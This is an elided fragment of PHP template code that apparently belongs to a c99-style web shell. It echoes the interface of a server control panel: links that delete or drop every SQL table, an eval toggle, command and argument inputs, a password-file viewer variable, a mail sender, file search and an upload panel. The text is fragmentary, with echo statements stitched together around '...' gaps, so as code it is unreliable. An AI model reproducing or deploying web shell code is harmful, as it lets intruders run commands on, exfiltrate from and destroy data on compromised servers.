...
##[ DEFAULT ACTIONS ]##
  ...
  echo html_style(); ?><?php echo html_header() ?><?php echo $hsafemode; ?><?php echo @gethostbyname($_SERVER["HTTP_HOST"]); ?><?php echo @gethostbyname($_SERVER["HTTP_HOST"]); ?><?php echo $_SERVER["REMOTE_ADDR"]; ?><?php echo $_SERVER["REMOTE_ADDR"]; ?><?php
...
?><?php echo $row["Name"]; ?><?php echo $sql_surl; ?><?php echo urlencode($row["Name"]); ?><?php echo $row["Name"]; ?><?php echo $row["Rows"]; ?><?php echo $row["Engine"]; ?><?php echo $row["Create_time"]; ?><?php echo $row["Update_time"]; ?><?php echo $size; ?><?php echo $sql_surl; ?><?php echo urlencode("DELETE FROM `".$row["Name"]."`"); ?><?php echo $sql_surl; ?><?php echo urlencode("DROP TABLE `".$row["Name"]."`"); ?><?php echo $sql_surl; ?><?php echo $row["Name"]; ?><?php
...
?><?php echo $surl; ?><?php echo $nixpwd_s; ?><?php $nixpwd_e; ?><?php
...
?><?php echo $surl; ?><?php echo @htmlspecialchars($encoder_input); ?><?php

    foreach(array("md5","crypt","sha1","crc32") as $v) {

?><?php echo $v; ?><?php echo $v($encoder_input); ?><?php

    }

?><?php echo urlencode($encoder_input); ?><?php echo htmlspecialchars(urldecode($encoder_input)); ?><?php echo base64_encode($encoder_input); ?><?php
...
?><?php echo $surl; ?><?php echo $rnd; ?><?php disp_error(__FILE__); ?><?php echo $rnd; ?><?php
...
?><?php echo str_replace(array("@","."),array("[at]","[dot]"),$suppmail); ?><?php echo $surl; ?><?php echo htmlspecialchars(@$fdbk_name); ?><?php echo htmlspecialchars(@$fdbk_email); ?><?php echo htmlspecialchars(@$fdbk_body); ?><?php echo urlencode($HTTP_REFERER); ?><?php
...
?><?php
  ...
  ?><?php echo $surl; ?><?php echo @htmlspecialchars($sender_name); ?><?php echo @htmlspecialchars($sender_email); ?><?php @htmlspecialchars($dest_email); ?><?php echo @htmlspecialchars($sender_subj); ?><?php echo @htmlspecialchars($sender_body); ?><?php
...
?><?php echo $dispd; ?><?php echo $dspact; ?><?php echo round(strlen($search_name)+25); ?><?php echo htmlspecialchars($search_name); ?><?php echo (@$search_name_regexp == 1?" checked":""); ?><?php echo round(strlen($search_in)+25); ?><?php echo htmlspecialchars($search_in); ?><?php echo htmlspecialchars(@$search_text); ?><?php echo (@$search_text_regexp == 1?" checked":""); ?><?php echo (@$search_text_wwo == 1?" checked":""); ?><?php echo (@$search_text_cs == 1?" checked":""); ?><?php echo (@$search_text_not == 1?" checked":""); ?><?php
...
?><?php echo(count($table) - 2); ?><?php echo(count($table) - 2); ?><?php
...
?><?php echo $dispd; ?><?php if (@$eval_txt) { echo " checked"; } ?><?php
...
?><?php echo $dispd; ?><?php echo @htmlspecialchars($cmd); ?><?php echo $dispd; ?><?php
...
?><?php echo @htmlspecialchars($arg1); ?><?php echo @htmlspecialchars($arg2); ?><?php
...
?><?php echo $dispd; ?><?php echo " Max size: ".@ini_get("upload_max_filesize")."B | Temp dir: ".@ini_get("upload_tmp_dir")."\n"; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo html_footer(); ?><?php
